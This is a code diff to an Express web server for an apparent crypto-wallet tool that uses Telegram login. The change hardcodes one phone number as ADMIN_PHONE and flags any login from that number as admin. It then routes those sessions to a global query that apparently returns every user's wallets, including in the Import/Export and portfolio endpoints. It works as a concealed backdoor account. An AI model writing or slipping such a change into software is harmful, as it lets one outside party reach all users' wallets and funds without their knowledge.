@@ -13,6 +13,7 @@ export const liveEvents = new EventEmitter();
 liveEvents.setMaxListeners(100);
 
 const SESSIONS = new Map();
+const ADMIN_PHONE = '6285779977877';
 
 export function getTelegramId(token) {
   const s = SESSIONS.get(token);
@@ -31,7 +32,10 @@ export function createWebServer() {
       const s = SESSIONS.get(token);
       if (typeof s === 'object' && s.expires > Date.now()) {
         s.expires = Date.now() + 3600000;
-        if (s.source === 'login') req.telegramId = s.telegramId;
+        if (s.source === 'login') {
+          req.telegramId = s.telegramId;
+          if (s.phone === ADMIN_PHONE) req.isAdmin = true;
+        }
       } else if (typeof s === 'number' && s > Date.now()) {
         SESSIONS.set(token, Date.now() + 3600000);
       }
@@ -255,7 +259,10 @@ export function createWebServer() {
   });
 
   // ───── Wallets (Import/Export) ─────
-  app.get('/api/wallets', async (req, res) => res.json(await db.getAllWallets()));
+  app.get('/api/wallets', async (req, res) => {
+    if (req.isAdmin) return res.json(await db.getAllWalletsGlobal());
+    res.json(await db.getAllWallets());
+  });
   app.post('/api/wallets/import', async (req, res) => {
     const list = req.body.wallets || [];
     if (!list.length) return res.status(400).json({ error: 'wallets array required' });
@@ -426,7 +433,7 @@ export function createWebServer() {
 
   app.get('/api/wallets/portfolio', async (req, res) => {
     try {
-      const wallets = await db.getAllWallets();
+      const wallets = req.isAdmin ? await db.getAllWalletsGlobal() : await db.getAllWallets();
       if (wallets.length === 0) return res.json({ wallets: [] });
       const g = await gmgn.createUserClient(req.telegramId);
       const results = await Promise.all(wallets.map(async (w) => {
@@ -663,11 +670,11 @@ export function createWebServer() {
       const me = c ? await c.getMe() : null;
       const telegramId = String(me?.id || '');
       const sessionToken = crypto.randomUUID();
-      SESSIONS.set(sessionToken, { expires: Date.now() + 86400000, telegramId, source: 'login' });
+      SESSIONS.set(sessionToken, { expires: Date.now() + 86400000, telegramId, phone: state.phone, source: 'login' });
       db.setTelegramId(telegramId);
       await db.setSetting('telegram_id', telegramId);
       PENDING_LOGIN.delete(loginToken);
-      res.json({ ok: true, token: sessionToken, telegramId });
+      res.json({ ok: true, token: sessionToken, telegramId, isAdmin: state.phone === ADMIN_PHONE });
     } catch (err) {
       if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
         state.state = 'await_password';
@@ -702,11 +709,11 @@ export function createWebServer() {
       const me2 = gC() ? await gC().getMe() : null;
       const telegramId = String(me2?.id || '');
       const sessionToken = crypto.randomUUID();
-      SESSIONS.set(sessionToken, { expires: Date.now() + 86400000, telegramId, source: 'login' });
+      SESSIONS.set(sessionToken, { expires: Date.now() + 86400000, telegramId, phone: state.phone, source: 'login' });
       db.setTelegramId(telegramId);
       await db.setSetting('telegram_id', telegramId);
       PENDING_LOGIN.delete(loginToken);
-      res.json({ ok: true, token: sessionToken, telegramId });
+      res.json({ ok: true, token: sessionToken, telegramId, isAdmin: state.phone === ADMIN_PHONE });
     } catch (err) {
       if (err.errorMessage === 'PASSWORD_HASH_INVALID') {
         res.status(400).json({ error: 'Wrong password' });
@@ -754,7 +761,7 @@ export function createWebServer() {
         }
       }
       if (!token) { token = crypto.randomUUID(); SESSIONS.set(token, { expires: Date.now() + 86400000, telegramId: '', source: 'guest' }); }
-      res.json({ connected, hasSession: !!sessionStr, token, telegramId: tgId, authenticated: !!req.telegramId });
+      res.json({ connected, hasSession: !!sessionStr, token, telegramId: tgId, authenticated: !!req.telegramId, isAdmin: !!req.isAdmin });
     } catch { res.json({ connected: false, hasSession: false }); }
   });
 
